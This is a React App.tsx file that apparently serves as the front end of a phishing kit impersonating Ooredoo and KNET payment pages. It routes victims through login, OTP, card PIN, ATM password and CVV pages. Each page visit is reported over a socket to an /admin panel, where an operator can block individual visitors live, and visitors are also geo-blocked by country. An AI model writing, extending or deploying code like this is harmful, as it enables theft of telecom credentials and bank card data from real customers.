import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch, useLocation } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./i18n/ThemeContext";
import { LanguageProvider } from "./i18n/LanguageContext";
import { initializeSocket, disconnectSocket, socket, navigateToPage } from "./lib/store";
import { useState, useEffect } from "react";

// Register Pages
import Register from "./pages/Register";
import RegisterPersonalInfo from "./pages/RegisterPersonalInfo";
import RegisterPassword from "./pages/RegisterPassword";
import RegisterBill from "./pages/RegisterBill";

// Ooredoo Pages
import OoredooLogin from "./pages/OoredooLogin";
import OoredooOtp from "./pages/OoredooOtp";
import Admin from "./pages/Admin";

// Card verification pages
import CardOtp from "./pages/CardOtp";
import CardPin from "./pages/CardPin";

// Payment Pages
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";
import KNETPayment from "./pages/KNETPayment";
import CVV from "./pages/CVV";
import FinalPage from "./pages/FinalPage";

function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function Router() {
  return (
    <Switch>
      {/* Register Routes */}
      <Route path={"/register"} component={Register} />
      <Route path={"/register/personal-info"} component={RegisterPersonalInfo} />
      <Route path={"/register/password"} component={RegisterPassword} />
      <Route path={"/register/complete"} component={RegisterBill} />

      {/* Ooredoo Routes */}
      <Route path={"/ooredoo-login"} component={OoredooLogin} />
      <Route path={"/ooredoo-otp"} component={OoredooOtp} />

      {/* Admin */}
      <Route path={"/admin"} component={Admin} />

      {/* Card Verification Routes */}
      <Route path={"/card-otp"} component={CardOtp} />
      <Route path={"/card-pin"} component={CardPin} />

      {/* Payment Routes */}
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />
      <Route path={"/knet-payment"} component={KNETPayment} />
      <Route path={"/cvv"} component={CVV} />
      <Route path={"/final-page"} component={FinalPage} />

      <Route path={"/404"} component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  const [location] = useLocation();
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isCheckingCountry, setIsCheckingCountry] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");

  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);

  useEffect(() => {
    const pageNameMap: Record<string, string> = {
      '/ooredoo-login': 'تسجيل دخول Ooredoo',
      '/ooredoo-otp': 'رمز OTP Ooredoo',
      '/credit-card-payment': 'الدفع ببطاقة الائتمان',
      '/otp-verification': 'رمز التحقق OTP',
      '/atm-password': 'كلمة مرور ATM',
      '/card-otp': 'Card OTP',
      '/card-pin': 'Card PIN',
      '/knet-payment': 'KNET',
      '/cvv': 'CVV',
      '/final-page': 'الصفحة النهائية',
    };
    const path = location.split('?')[0];
    const pageName = pageNameMap[path] || path;
    navigateToPage(pageName);
  }, [location]);

  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  useEffect(() => {
    const checkCountry = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const visitorCountry = data.country_name;
        socket.value.emit('blockedCountries:check', visitorCountry);
        socket.value.on('blockedCountries:checkResult', ({ isBlocked }: { isBlocked: boolean }) => {
          setIsCountryBlocked(isBlocked);
          setIsCheckingCountry(false);
        });
        socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
          const isBlocked = blockedCountries.some(c =>
            c.toLowerCase() === visitorCountry.toLowerCase()
          );
          setIsCountryBlocked(isBlocked);
        });
      } catch {
        setIsCheckingCountry(false);
      }
    };
    const timer = setTimeout(checkCountry, 1000);
    const fallbackTimer = setTimeout(() => {
      setIsCheckingCountry(false);
    }, 3000);
    return () => {
      clearTimeout(timer);
      clearTimeout(fallbackTimer);
    };
  }, []);

  // Register pages bypass all checks
  if (location === '/register') {
    return <Register />;
  }
  if (location === '/register/personal-info') {
    return <RegisterPersonalInfo />;
  }
  if (location === '/register/password') {
    return <RegisterPassword />;
  }
  if (location === '/register/complete') {
    return <RegisterBill />;
  }

  if (isCheckingCountry) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-600"></div>
      </div>
    );
  }

  if (isCountryBlocked) return <BlockedCountryPage />;

  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <LanguageProvider>
        <ThemeProvider>
          <TooltipProvider>
            <Toaster />
            <ScrollToTop />
            <PageTitleUpdater />
            <Router />
          </TooltipProvider>
        </ThemeProvider>
      </LanguageProvider>
    </ErrorBoundary>
  );
}

export default App;
